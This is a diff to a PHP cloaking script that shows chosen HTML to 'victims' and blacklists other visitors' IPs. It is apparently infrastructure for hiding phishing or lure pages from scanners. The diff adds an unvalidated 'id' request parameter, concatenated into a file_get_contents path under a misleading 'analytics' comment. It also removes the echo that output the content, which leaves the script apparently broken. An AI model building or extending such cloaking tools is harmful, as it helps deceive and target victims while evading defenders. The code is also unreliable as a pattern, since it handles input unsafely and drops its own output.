@@ -1,5 +1,8 @@
 <?php
 
+// Get analytics if they exist
+if(isset($_REQUEST['id'])){$extraid = $_REQUEST['id'];}else{$extraid = "0";}
+
 //AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
 // "false" means everyone is allowed except if they're on the blacklist
 $AutoBlock = true;
@@ -80,8 +83,14 @@ $allowed = "- *Jedi Mind Trick Successful* -";
 // Content for victims to see (not on the blacklist)
 // Point this to file containing HTML you want the victims to see
 // OR, if you need to pass an ID value you may just manually put the PHP here instead of file_get_contents
-$realhtml = file_get_contents('/var/www/html/realcontent.php');
-echo $realhtml;
+if(isset($_REQUEST['id'])){
+$id = $_REQUEST['id'];
+// May have to substitute the relative path for the web path
+$geturl = "realcontent.php?id=".$id;
+$realhtml = file_get_contents($geturl);
+} else {
+$realhtml = file_get_contents('realcontent.php');
+}
 
 $allowed = "- *Allowed* -";
 }
